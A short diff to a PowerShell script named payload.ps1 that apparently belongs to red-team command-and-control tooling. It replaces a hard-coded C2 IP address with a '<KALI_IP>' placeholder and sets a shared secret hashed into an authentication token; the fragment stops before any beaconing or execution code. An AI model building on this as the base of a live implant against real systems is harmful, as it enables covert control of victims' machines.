@@ -1,6 +1,6 @@
 # payload.ps1
 
-$C2      = "https://100.65.4.238"
+$C2      = "https://<KALI_IP>"
 $Secret  = "foxtrot-redteam-2026"
 $Token   = -join ([System.Security.Cryptography.SHA256]::Create().ComputeHash(
                [System.Text.Encoding]::UTF8.GetBytes($Secret)
